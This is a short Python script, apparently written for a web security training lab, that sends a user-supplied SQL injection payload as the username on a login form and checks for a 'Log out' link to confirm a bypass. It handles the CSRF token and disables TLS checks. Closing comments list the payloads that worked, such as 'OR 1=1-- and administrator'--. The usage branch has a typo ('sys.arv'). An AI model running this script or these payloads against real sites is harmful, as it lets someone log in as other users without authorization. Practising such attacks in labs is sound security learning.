import requests
import sys
import urllib3

from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080' }

def get_csrf_token(session, url):
    response = session.get(
        url,
        verify=False,
        proxies=proxies)
    soup = BeautifulSoup(
        response.text, 
        'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def is_exploitable(url, payload, session):
    csrf = get_csrf_token(session, url)
    data = {"csrf": csrf,
            "username": payload,
            "password": "randomtext"}
    response = session.post(
        url, 
        data=data,
        verify=False,
        proxies=proxies).text
    return "Log out" in response

def get_url_payload(arg1, arg2):
    url = arg1.strip()
    payload = arg2.strip()
    return url, payload

if __name__ == "__main__":
    try:
        url, payload = get_url_payload(
            sys.argv[1],
            sys.argv[2])
        session = requests.Session()
        if is_exploitable(url, payload, session):
            print("[+] SQL injection successful!")
        else:
            print("[-] SQL injection unsuccessful")
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.arv[0])
        sys.exit(-1)

# SQL Injection - login functionality
# Perform SQLi attack and login as the administrator

# Analysis:
# admin, admin responds with bad username or password
# ', admin responds with Internal Server Error, May be suspectible to SQL Injection
# SELECT firstname FROM users where username='admin' and pasword ='admin'
# 'OR 1=1--, admin, responds with you solved the lab
# administrator'--, had to encode this administrator%27--